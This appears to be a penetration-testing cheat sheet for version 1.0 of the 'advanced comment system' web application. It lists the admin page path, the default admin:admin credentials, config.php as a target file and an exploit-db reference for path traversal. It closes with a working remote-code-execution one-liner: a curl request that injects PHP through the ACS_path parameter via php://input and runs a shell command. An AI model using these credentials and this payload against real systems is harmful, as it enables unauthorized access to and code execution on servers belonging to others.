# advanced comment system

## Admin Path

```bash
/advanced_comment_system/admin.php
```

## Default Credentials

```bash
admin:admin
```

## Interesting Paths

```bash
config.php
```

## Path Traversal v1.0

```bash
https://www.exploit-db.com/exploits/49343
```

## RCE

v1.0

```bash
# https://pentest.tonyng.net/timo-sablowskis-oscp-note/
curl "IP/advanced_comment_system/admin.php?ACS_path=php://input%00" -s --data "<?system('ls -la');?>"
```
